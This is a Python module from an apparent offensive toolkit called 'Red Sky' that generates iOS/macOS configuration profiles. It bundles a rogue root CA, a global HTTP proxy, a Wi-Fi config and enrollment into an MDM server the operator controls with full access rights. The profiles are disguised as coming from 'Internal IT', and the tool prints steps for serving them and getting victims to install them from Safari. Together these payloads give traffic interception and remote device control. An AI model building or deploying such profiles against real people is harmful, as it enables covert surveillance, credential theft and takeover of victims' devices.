# language: Python, file: Program/mobile/ios.py, target: Red Sky mobile — .mobileconfig profile generator
# Builds configuration profiles for iOS/macOS. Supported payload types:
#   - root cert install (adds a CA to the trusted store)
#   - web clip (a home-screen icon that opens any URL)
#   - MDM enrollment (points the device at an MDM server you control)
#   - Wi-Fi (drops a wifi config, can route traffic)
#   - proxy (points the device at an HTTP/HTTPS/SOCKS proxy)
# The generated .mobileconfig is a plist. Signing with a valid cert raises the
# install-prompt trust, but unsigned profiles still install on older iOS.

import plistlib
import subprocess
import sys
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


MOB_DIR = OUTPUT_DIR / "mobile"
PROFILES_DIR = MOB_DIR / "profiles"


def _uuid() -> str:
    return str(uuid.uuid4()).upper()


def _base_payload(name: str, description: str, identifier: str) -> Dict:
    return {
        "PayloadType": "Configuration",
        "PayloadVersion": 1,
        "PayloadIdentifier": identifier,
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": name,
        "PayloadDescription": description,
        "PayloadOrganization": "Internal IT",
        "PayloadRemovalDisallowed": False,
    }


def payload_root_cert(cert_bytes: bytes, display_name: str) -> Dict:
    return {
        "PayloadType": "com.apple.security.root",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.rootcert." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": display_name,
        "PayloadCertificateFileName": "ca.pem",
        "PayloadContent": cert_bytes,
    }


def payload_webclip(url: str, label: str, fullscreen: bool = True) -> Dict:
    return {
        "PayloadType": "com.apple.webClip.managed",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.webclip." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": label,
        "Label": label,
        "URL": url,
        "FullScreen": fullscreen,
        "IsRemovable": True,
        "Precomposed": False,
    }


def payload_mdm(server_url: str, topic: str, challenge: str = "") -> Dict:
    return {
        "PayloadType": "com.apple.mdm",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.mdm." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": "MDM",
        "ServerURL": server_url,
        "CheckInURL": server_url.rstrip("/") + "/checkin",
        "Topic": topic,
        "IdentityCertificateUUID": _uuid(),
        "SignMessage": False,
        "CheckOutWhenRemoved": False,
        "AccessRights": 8191,
        "UseDevelopmentAPNS": False,
    }


def payload_wifi(ssid: str, password: str, security: str = "WPA") -> Dict:
    return {
        "PayloadType": "com.apple.wifi.managed",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.wifi." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": "Wi-Fi (" + ssid + ")",
        "SSID_STR": ssid,
        "EncryptionType": security,
        "Password": password,
        "AutoJoin": True,
        "ProxyType": "Manual",
        "ProxyServer": "",
        "ProxyServerPort": 0,
    }


def payload_proxy(server: str, port: int, mode: str = "Manual") -> Dict:
    return {
        "PayloadType": "com.apple.proxy.http.global",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.proxy." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": "Global HTTP Proxy",
        "ProxyType": mode,
        "ProxyServer": server,
        "ProxyServerPort": port,
        "ProxyUsername": "",
        "ProxyPassword": "",
        "ProxyPACURL": "",
        "AllowDirectAccess": False,
    }


def payload_websocket_filter(hostnames: List[str]) -> Dict:
    """Not a real Apple payload — placeholder for a DNS/URL filter config."""
    return {
        "PayloadType": "com.apple.webContentFilter.managed",
        "PayloadVersion": 1,
        "PayloadIdentifier": "com.internal.webfilter." + _uuid()[:8],
        "PayloadUUID": _uuid(),
        "PayloadDisplayName": "Web Content Filter",
        "FilterType": "BuiltIn",
        "AutoFilterEnabled": True,
        "WhitelistedBookmarks": [{"URL": h, "Title": h} for h in hostnames],
    }


def build_profile(name: str, description: str, payloads: List[Dict]) -> Dict:
    profile = _base_payload(name, description, "com.internal.profile." + _uuid()[:8])
    profile["PayloadContent"] = payloads
    return profile


def _sign(profile_path: Path, cert_path: str, key_path: str) -> Optional[Path]:
    """Sign the .mobileconfig with openssl smime. Requires a PEM cert + key."""
    signed = profile_path.with_suffix(".signed.mobileconfig")
    try:
        r = subprocess.run(
            ["openssl", "smime", "-sign",
             "-signer", cert_path, "-inkey", key_path,
             "-certfile", cert_path, "-nodetach", "-outform", "der",
             "-in", str(profile_path), "-out", str(signed)],
            capture_output=True, text=True, timeout=60,
        )
        if r.returncode == 0:
            return signed
        print_warn("openssl sign failed: " + (r.stderr.strip()[:300] or "unknown"))
        return None
    except FileNotFoundError:
        print_warn("openssl not on PATH — profile will be unsigned")
        return None


def cmd_build(kind: str, name: str, out_path: str,
              cert_path: str, key_path: str,
              # per-kind opts
              root_cert: str,
              webclip_url: str,
              mdm_server: str,
              mdm_topic: str,
              wifi_ssid: str,
              wifi_pass: str,
              proxy_server: str,
              proxy_port: int) -> int:
    PROFILES_DIR.mkdir(parents=True, exist_ok=True)

    payloads: List[Dict] = []

    if kind == "rootcert":
        if not root_cert:
            print_err("--root-cert <pem> needed for a rootcert profile")
            return 2
        b = Path(root_cert).expanduser().read_bytes()
        payloads.append(payload_root_cert(b, "Internal Root CA"))
        print_kv("cert bytes", len(b))

    elif kind == "webclip":
        if not webclip_url:
            print_err("--webclip-url needed")
            return 2
        payloads.append(payload_webclip(webclip_url, name or "Portal"))
        print_kv("url", webclip_url)

    elif kind == "mdm":
        if not mdm_server:
            print_err("--mdm-server needed")
            return 2
        payloads.append(payload_mdm(mdm_server, mdm_topic or "com.internal.mdm.topic"))
        print_kv("server", mdm_server)

    elif kind == "wifi":
        if not wifi_ssid:
            print_err("--wifi-ssid needed")
            return 2
        payloads.append(payload_wifi(wifi_ssid, wifi_pass or "", "WPA" if wifi_pass else "None"))
        if proxy_server:
            payloads.append(payload_proxy(proxy_server, proxy_port))
        print_kv("ssid", wifi_ssid)

    elif kind == "proxy":
        if not proxy_server:
            print_err("--proxy-server needed")
            return 2
        payloads.append(payload_proxy(proxy_server, proxy_port))
        print_kv("proxy", proxy_server + ":" + str(proxy_port))

    elif kind == "combo":
        # everything at once — the "kitchen sink" profile
        if root_cert:
            b = Path(root_cert).expanduser().read_bytes()
            payloads.append(payload_root_cert(b, "Internal Root CA"))
        if webclip_url:
            payloads.append(payload_webclip(webclip_url, name or "Portal"))
        if mdm_server:
            payloads.append(payload_mdm(mdm_server, mdm_topic or "com.internal.mdm.topic"))
        if wifi_ssid:
            payloads.append(payload_wifi(wifi_ssid, wifi_pass or "", "WPA" if wifi_pass else "None"))
        if proxy_server:
            payloads.append(payload_proxy(proxy_server, proxy_port))
        if not payloads:
            print_err("combo needs at least one of --root-cert --webclip-url --mdm-server --wifi-ssid --proxy-server")
            return 2

    else:
        print_err("unknown kind: " + kind)
        print_info("kinds: rootcert webclip mdm wifi proxy combo")
        return 2

    profile = build_profile(name or "Internal Profile",
                            "Installed by IT. Contact support if unexpected.",
                            payloads)

    out = Path(out_path) if out_path else PROFILES_DIR / ((name or kind) + "-" + str(int(time.time())) + ".mobileconfig")
    with out.open("wb") as f:
        plistlib.dump(profile, f, sort_keys=False)

    print()
    print_ok("profile written " + str(out))
    print_kv("payloads", len(payloads))
    for p in payloads:
        print("  " + ARTERY + p.get("PayloadType", "?") + RESET)

    if cert_path and key_path:
        signed = _sign(out, cert_path, key_path)
        if signed:
            print_ok("signed -> " + str(signed))
    else:
        print()
        print_info("unsigned profile. to sign: rerun with --cert <pem> --key <pem>")

    print()
    print_info("serve it: python3 -m http.server 8080 --directory " + str(out.parent))
    print_info("deliver the link on iOS Safari — tap, Settings -> Profile Downloaded -> Install")
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky mobile ios", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("kind", nargs="?", default="webclip",
                   choices=["rootcert", "webclip", "mdm", "wifi", "proxy", "combo"])
    p.add_argument("--name", default="")
    p.add_argument("--out", default="")
    p.add_argument("--cert", default="")
    p.add_argument("--key", default="")
    p.add_argument("--root-cert", default="")
    p.add_argument("--webclip-url", default="")
    p.add_argument("--mdm-server", default="")
    p.add_argument("--mdm-topic", default="")
    p.add_argument("--wifi-ssid", default="")
    p.add_argument("--wifi-pass", default="")
    p.add_argument("--proxy-server", default="")
    p.add_argument("--proxy-port", type=int, default=8080)

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky mobile ios <rootcert|webclip|mdm|wifi|proxy|combo> [opts]")
        return 2

    if ns.help:
        print_info("examples:")
        print_info("  redsky mobile ios rootcert --root-cert ca.pem --name 'Internal CA'")
        print_info("  redsky mobile ios webclip  --webclip-url https://portal.example.com --name Portal")
        print_info("  redsky mobile ios mdm      --mdm-server https://mdm.example.com/mdm --mdm-topic com.x.mdm")
        print_info("  redsky mobile ios wifi     --wifi-ssid CorpNet --wifi-pass hunter2 --proxy-server 10.0.0.5 --proxy-port 8080")
        print_info("  redsky mobile ios combo    --root-cert ca.pem --webclip-url https://x/ --proxy-server 10.0.0.5")
        print_info("sign with --cert leaf.pem --key leaf.key")
        return 0

    return cmd_build(
        ns.kind, ns.name, ns.out, ns.cert, ns.key,
        ns.root_cert, ns.webclip_url, ns.mdm_server, ns.mdm_topic,
        ns.wifi_ssid, ns.wifi_pass, ns.proxy_server, ns.proxy_port,
    )


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
